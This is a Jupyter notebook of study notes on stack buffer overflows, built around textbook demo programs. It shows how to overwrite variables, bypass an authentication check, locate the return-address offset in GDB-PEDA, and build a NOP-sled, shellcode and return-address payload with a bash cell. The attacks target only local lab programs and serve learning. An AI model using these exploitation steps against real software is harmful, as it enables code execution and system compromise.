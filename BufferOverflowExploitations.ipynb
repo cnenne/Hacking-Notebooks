{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Buffer Overflows\n",
    "- most Internet worms use buffer overflow vulnerabilities to propagate\n",
    "- C and C++ are high level programming languages, but they still assume that programmers responsible for data integrity\n",
    "- modern compilers and OSes provide various protections making it harder to exploit traditional buffer overflows\n",
    "- once the buffer is allocated, there's no built-in mechanism to safeguard the amount of data that can be stored into to\n",
    "    - this is called buffer overrun or buffer overflow\n",
    "    - user data may overwrite other part of the memory it's not supposed to making the program behave differently or crashing the program\n",
    "    - hackers could take advantage of this flaw to control the program and may pawn the system by executing shellcode or payload of their choice\n",
    "- typically two types:\n",
    "    1. stack overflow\n",
    "    2. heap overflow"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stack Overflow\n",
    "- overrun in stack segment\n",
    "\n",
    "### some demo programs that demonstrate stackoverflow\n",
    "\n",
    "### overwrite variable values with the data of your choice\n",
    "1. booksrc/overflow_example.c\n",
    "- compile and run the program with some arguments\n",
    "    - `./overflow_example $(perl -e 'print \"A\"x15')`\n",
    "    - `./overflow_example $(perl -e 'print \"A\"x16')`\n",
    "- try to overwrite value of int value variable with \"BCDE\"\n",
    "- find the difference between the address of value and buffer_two\n",
    "    - perl -e 'print hex(0xbffff1dc-0xbffff1cc)' -> 22 bytes? should be 16\n",
    "    - `./overflow_example $(perl -e 'print \"A\"x16 . \"BCDE\"')`\n",
    "    - `./overflow_example $(perl -e 'print \"Ax16 . \"\\x45\\x44\\x43\\x42\")`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### change the flow of the program\n",
    "#### authenticate without using actual password\n",
    "\n",
    "2. booksrc/auth_overflow.c\n",
    "- overrun the buffer to print \"Access Granted\" without providing actual password\n",
    "    - `./compile.sh auth_overflow_c auth_overflow`\n",
    "    - `./auth_overflow $(perl -e 'print \"A\"x20')`\n",
    "    \n",
    "- run the program in GDB to see the value of auth_flag\n",
    "    - ./gdb -q auth_overflow\n",
    "    - break main\n",
    "    - break check_authentication\n",
    "    - run $(perl -e 'print \"A\"x20')\n",
    "    - x/s password_buffer\n",
    "    - x/x &auth_flag"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### can you overflow if the variable declaration orders are switched?\n",
    "#### overwrite the return address to authenticate? doesn't work on newer system (tested on Kali (4-19-0)!\n",
    "3. booksrc/authoverflow2.c\n",
    "- see in gdb where auth_flag is compared to password_buffer\n",
    "- turns out auth_flag is still at higher address (pushed before) compared to password_buffer\n",
    "- address with As"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## stackoverflow exploit demo\n",
    "- ./compile.sh booksrc/stackoverflowdemo.c stackoverflowdemo\n",
    "- ./python2 exploit_stackoverflow.py\n",
    "\n",
    "### How was the exploit_stackoverflow.py generated?\n",
    "\n",
    "### Use GDB-PEDA\n",
    "- create pattern and use as an agrument to the program\n",
    "    - gdb -q ./stackoverflowdemo\n",
    "    - pattern arg 200\n",
    "    - run \n",
    "    - after program crashes run\n",
    "    - patts or pattern search\n",
    "    - look for EIP.and note the EIP offset\n",
    "        - ..found at offset [#] that's the total offset  where return address (to end of retrun address) is from the overflown buffer base address \n",
    "- generate skeleton exploit code using GDB-PEDA\n",
    "    - skeleton argv exploit_stackoverflow.py\n",
    "- create local linux shellcode \n",
    "    - shellcode generate x86/linux exec\n",
    "- copy the shellcode in the python exploit code\n",
    "- create payload: `[NOP sled | exploit | return address]`\n",
    "- find return address somewhere in the middle of buffer using GDB"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Using bash to exploit stackoverflowdemo.exe\n",
    "- create the buffer with payload\n",
    "    - 48 bytes nop sleds + shellcode (24 bytes) + return address (4 bytes)\n",
    "- run program with the payload\n",
    "    - `$ ./stackoverflowdemo.exe $(cat payloadFile)`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "./booksrc/stackoverflowpayload.bin Size in bytes\n",
      "76 ./booksrc/stackoverflowpayload.bin\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "payloadFile=./booksrc/stackoverflowpayload.bin\n",
    "perl -e 'print \"\\x90\"x48' > $payloadFile\n",
    "cat ./booksrc/shellcodex86linuxexec >> $payloadFile\n",
    "perl -e 'print \"\\x34\\xf1\\xff\\xbf\"' >> $payloadFile\n",
    "# check the size of the file\n",
    "echo \"$payloadFile Size in bytes\"\n",
    "wc -c $payloadFile"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### notesearch has stackoverflow vulnerability\n",
    "- booksrc/notesearch.c\n",
    "\n",
    "- compile.sh notesearch.c notesearch.exe\n",
    "- `./notesearch.exe $(perl -e 'print '\"A\"x60')`\n",
    "\n",
    "### exploit_notesearch.c is a complete exploit program that exploits stackoverflow in notesearch\n",
    "- ./compile.sh exploit_notesearch.c exploit_notesearch.exe\n",
    "- ./exploit_notesearch.exe\n",
    "- run the provided exploit_notesearch.sh script to determine the offset\n",
    "    - change the range if you still do not get the shell"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
